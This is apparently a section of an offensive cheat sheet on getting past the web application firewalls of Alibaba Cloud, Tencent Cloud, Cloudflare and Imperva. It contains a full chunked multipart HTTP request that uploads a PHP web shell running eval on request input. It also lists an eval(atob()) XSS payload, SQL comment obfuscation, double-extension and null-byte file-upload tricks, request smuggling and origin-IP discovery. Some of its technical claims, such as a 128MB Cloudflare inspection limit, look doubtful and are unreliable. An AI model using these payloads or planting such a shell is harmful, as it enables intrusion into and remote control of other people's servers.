## 7. 2026 LATEST DETECTION BYPASS

### 7.1 Alibaba Cloud WAF (阿里云 WAF) Bypass

**Known bypass vectors for Alibaba Cloud WAF:**

```
1. Chunked Transfer Encoding bypass
   Alibaba WAF may not fully reassemble chunked bodies before inspection.

2. Content-Type manipulation
   Use multipart/form-data with boundary tricks.

3. HTTP Parameter Pollution (HPP)
   Send duplicate parameters; WAF inspects first, application uses last.

4. Unicode normalization bypass
   Alibaba WAF may normalize Unicode differently than the backend.

5. HTTP/2 to HTTP/1.1 downgrade attacks
   Send via HTTP/2, WAF inspects HTTP/1.1 version.

6. JSON body encoding
   Send payload in JSON format; WAF may not inspect JSON deeply.

7. Base64 within JSON
   Encode payload as Base64 inside JSON values.

8. Protobuf/gRPC payload
   Use protobuf encoding; WAF may not support protobuf inspection.
```

**Alibaba Cloud WAF bypass payload example:**

```http
POST /upload.php HTTP/1.1
Host: target.aliyuncs.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Transfer-Encoding: chunked

1a
------WebKitFormBoundary
0d
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

0d

<?php
$a = $_REQUEST['a'];
if($a){@eval($a);}
?>

0d
------WebKitFormBoundary--
0

```

### 7.2 Tencent Cloud WAF (腾讯云 WAF) Bypass

```
1. SQL injection bypass via MySQL comment tricks
   /*!50000SELECT*/ instead of SELECT

2. XSS bypass via event handler obfuscation
   <img src=x onerror=eval(atob('base64_payload'))>

3. File upload bypass via double extension
   shell.php.jpg or shell.php%00.jpg

4. HTTP/2 multiplexing
   Send concurrent streams; WAF may not correlate across streams.

5. TLS fingerprint spoofing
   Use custom TLS client hello to mimic legitimate browsers.

6. Case variation
   Eval → EvAl → EVAL → eVAL

7. Tab/newline injection in headers
   X-Forwarded-For:\t127.0.0.1
```

### 7.3 Cloudflare WAF Bypass

```
1. Cloudflare allows certain paths by default
   /admin/, /api/, /wp-admin/ may have different rules.

2. Origin IP discovery
   If Cloudflare is reverse proxy, find origin IP and bypass entirely.

3. WebSocket upgrade
   Upgrade to WebSocket; Cloudflare may not inspect WS frames.

4. HTTP/2 Cleartext (h2c) upgrade
   Upgrade from HTTP/1.1 to h2c; bypasses Cloudflare inspection.

5. Cache poisoning + WAF bypass
   Poison Cloudflare cache with allowed response; WAF caches the bypass.

6. Large payload overflow
   Send payload larger than Cloudflare inspection limit (typically 128MB).

7. Rate limit bypass
   Distribute requests across multiple IPs and subdomains.

8. Cloudflare Transform Rules bypass
   Manipulate headers that Cloudflare adds/removes.
```

### 7.4 Imperva WAF Bypass

```
1. Imperva decoding order abuse
   Exploit the order Imperva decodes URL/HTML/Base64 vs. backend.

2. Double URL encoding
   %2527 → %27 → ' (Imperva decodes once, backend decodes twice)

3. Null byte injection
   shell.php%00.jpg → Imperva sees .jpg, backend sees .php

4. Request smuggling
   CL.TE or TE.CL smuggling against Imperva proxy.

5. Custom encoding
   IBM code page, UTF-7, UTF-16, UCS-2 encoding bypass.

6. Imperva-specific header bypass
   Some Imperva deployments ignore custom headers.
```

---

